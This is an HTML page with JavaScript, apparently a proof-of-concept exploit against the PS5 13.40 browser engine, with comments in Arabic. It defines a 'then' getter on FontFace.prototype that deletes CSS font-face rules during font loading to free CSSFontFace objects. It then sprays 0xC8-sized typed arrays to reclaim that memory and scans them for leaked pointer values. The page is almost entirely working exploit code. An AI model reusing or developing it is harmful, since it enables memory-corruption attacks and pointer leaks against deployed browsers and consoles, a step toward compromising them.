<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS5 13.40 — CSSFontFace Reclaim Test</title>
</head>
<body>
<script>
"use strict";

// ========== تكوين الـ font-face rules ==========
const style = document.createElement('style');
style.textContent = `
@font-face { font-family: 'F1'; src: local('Arial'); unicode-range: U+41-42; }
@font-face { font-family: 'F2'; src: local('Arial'); unicode-range: U+43-44; }
@font-face { font-family: 'F3'; src: local('Arial'); unicode-range: U+45-46; }
@font-face { font-family: 'F4'; src: local('Arial'); unicode-range: U+47-48; }
@font-face { font-family: 'F5'; src: local('Arial'); unicode-range: U+49-50; }
`;
document.head.appendChild(style);

const log = [];
let reclaimResults = [];

// ========== 3 أنواع reclaim ==========
function tryReclaimMethods() {
    const methods = [];
    
    // الطريقة 1: Uint8Array(0xC8) — تطابق حجم CSSFontFace القديم
    for (let i = 0; i < 500; i++) {
        methods.push(new Uint8Array(0xC8));
    }
    
    // الطريقة 2: ArrayBuffer(0xC8) — مخازن خلفية مختلفة
    for (let i = 0; i < 500; i++) {
        methods.push(new ArrayBuffer(0xC8));
    }
    
    // الطريقة 3: Float64Array(0x19) — 0xC8 / 8 = 0x19
    for (let i = 0; i < 500; i++) {
        methods.push(new Float64Array(0x19));
    }
    
    return methods;
}

// ========== Getter setup ==========
Object.defineProperty(FontFace.prototype, 'then', {
    get() {
        log.push('then fired');
        
        // CSSOM mutation
        if (style.sheet) {
            while (style.sheet.cssRules.length > 0) style.sheet.deleteRule(0);
        }
        if (style.parentNode) style.parentNode.removeChild(style);
        
        // reclaim batch 1: قبل الـ flush
        const r1 = tryReclaimMethods();
        reclaimResults.push({ phase: 'beforeFlush', methods: r1 });
        
        document.body.getBoundingClientRect();
        
        // reclaim batch 2: بعد الـ flush
        const r2 = tryReclaimMethods();
        reclaimResults.push({ phase: 'afterFlush', methods: r2 });
        
        return undefined;
    }
});

// تشغيل
document.fonts.load('16px F1, F2, F3, F4, F5', 'ABCDE').then(faces => {
    log.push('done: ' + faces.length + ' faces');
    console.log(log.join('\n'));
    
    // افحص reclaim arrays
    let found = 0;
    for (const batch of reclaimResults) {
        for (const m of batch.methods) {
            // اقرأ أول 10 قيم
            for (let i = 0; i < Math.min(10, m.length || m.byteLength); i++) {
                const v = m[i];
                if (v && v > 0x100000000000 && v < 0x10000000000000) {
                    console.log('🔴 LEAKED [' + batch.phase + ']: 0x' + v.toString(16).toUpperCase());
                    found++;
                    break;
                }
            }
            if (found > 50) break;
        }
        if (found > 50) break;
    }
    
    console.log('Total leaked: ' + found);
});
</script>
</body>
</html>
